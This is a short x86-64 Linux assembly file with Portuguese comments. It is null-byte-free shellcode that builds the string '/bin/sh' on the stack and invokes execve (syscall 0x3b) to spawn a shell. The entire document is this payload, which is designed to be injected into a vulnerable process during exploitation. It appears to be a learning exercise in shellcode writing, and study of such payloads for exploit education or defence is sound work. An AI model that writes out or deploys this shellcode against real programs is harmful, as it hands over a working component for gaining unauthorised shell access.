global _start
_start:
xor rdi, rdi ;zera rdi
push rdi ;puxa 0 pra stack
push rdi ;puxa 0 pra stack
pop rsi ;pega 0 da stack
pop rdx ;pega 0 da stack

mov rdi, 0x68732f6e69622f2f ;insere hs/nib// no rdi
shr rdi, 0x08 ; insere null byte no ultimo byte da string
push rdi ;puxa endereco da string na stack

push rsp ;puxa stack pointer pra stack

pop rdi; pega ponteiro do rdi

push 0x3b
pop rax
syscall
